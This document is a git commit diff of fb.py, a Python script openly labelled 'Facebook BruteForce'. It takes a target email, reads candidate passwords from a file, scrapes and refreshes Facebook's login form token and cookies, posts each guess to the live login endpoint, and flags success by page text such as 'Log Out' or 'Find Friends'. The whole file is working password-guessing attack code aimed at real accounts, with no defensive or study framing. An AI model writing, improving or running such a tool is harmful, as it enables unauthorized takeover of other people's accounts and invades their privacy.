16665111da2fd0fe715e88736fe550ae1cec15c7
Werths <24620094+IAmBlackHacker@users.noreply.github.com>
2021-05-02 15:28:17 +0530

    Update fb.py

--- fb.py
+++ fb.py
@@ -1,64 +1,62 @@
+import os.path
 import requests
-import threading
-# import urllib.request
-# import os
 from bs4 import BeautifulSoup
 import sys
 
-if sys.version_info[0] !=3: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 3.x
-	use: python3 fb.py
---------------------------------------
-			''')
-	sys.exit()
+if sys.version_info[0] != 3:
+    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
+    fb.py\n\t--------------------------------------''')
+    sys.exit()
 
-post_url='https://www.facebook.com/login.php'
-headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+PASSWORD_FILE = "passwords.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
-payload={}
-cookie={}
+PAYLOAD = {}
+COOKIES = {}
+
 
 def create_form():
-	form=dict()
-	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-	data=requests.get(post_url,headers=headers)
-	for i in data.cookies:
-		cookie[i.name]=i.value
-	data=BeautifulSoup(data.text,'html.parser').form
-	if data.input['name']=='lsd':
-		form['lsd']=data.input['value']
-	return (form,cookie)
+    data = requests.get(POST_URL, headers=HEADERS)
+    for i in data.cookies:
+        cookies[i.name] = i.value
+    data = BeautifulSoup(data.text, 'html.parser').form
+    if data.input['name'] == 'lsd':
+        form['lsd'] = data.input['value']
+    return form, cookies
 
-def function(email,passw,i):
-	global payload,cookie
-	if i%10==1:
-		payload,cookie=create_form()
-		payload['email']=email
-	payload['pass']=passw
-	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
-	if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
-		open('temp','w').write(str(r.content))
-		print('\npassword is : ',passw)
-		return True
-	return False
 
-print('\n---------- Welcome To Facebook BruteForce ----------\n')
-file=open('passwords.txt','r')
+def is_this_a_password(email, index, password):
+    global PAYLOAD, COOKIES
+    if index % 10 == 0:
+        PAYLOAD, COOKIES = create_form()
+        PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
+    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        open('temp', 'w').write(str(r.content))
+        print('\npassword found is: ', password)
+        return True
+    return False
 
-email=input('Enter Email/Username : ')
 
-print("\nTarget Email ID : ",email)
-print("\nTrying Passwords from list ...")
-
-i=0
-while file:
-	passw=file.readline().strip()
-	i+=1
-	if len(passw) < 6:
-		continue
-	print(str(i) +" : ",passw)
-	if function(email,passw,i):
-		break
+if __name__ == "__main__":
+    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    if not os.path.isfile(PASSWORD_FILE):
+        print("Password file is not exist: ", PASSWORD_FILE)
+        sys.exit(0)
+    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    print("Password file selected: ", PASSWORD_FILE)
+    email = input('Enter Email/Username to target: ').strip()
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print("Trying password [", index, "]: ", password)
+        if is_this_a_password(email, index, password):
+            break
